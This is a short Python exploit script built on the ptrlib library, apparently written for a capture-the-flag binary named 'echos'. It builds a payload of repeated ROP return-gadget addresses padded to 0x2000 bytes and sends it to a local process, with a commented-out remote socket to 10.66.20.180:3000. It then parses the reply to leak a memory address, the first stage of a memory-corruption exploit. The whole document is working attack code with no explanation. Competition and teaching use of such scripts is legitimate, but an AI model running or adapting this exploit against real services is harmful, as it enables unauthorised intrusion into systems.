from ptrlib import *
rop_ret = 0x08048436

payload = b"\xf7\xf7" # read
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret)
payload += p32(rop_ret) # atoi
payload += p32(rop_ret)
payload += b'A' * (0x2000 - len(payload) - 1)

while True:
    sock = Process("./echos")
    #sock = Socket("10.66.20.180", 3000)
    sock.sendline(str(0x2000))
    sock.send(payload)
    a = sock.recvonce(0x2000)
    x = a.lstrip(b"\x00")
    addr = u32(x[x.index(b'\x00' * 8) + 8:x.index(b'\x00' * 8) + 12])
    print(hex(addr))
    print(a)
    exit()
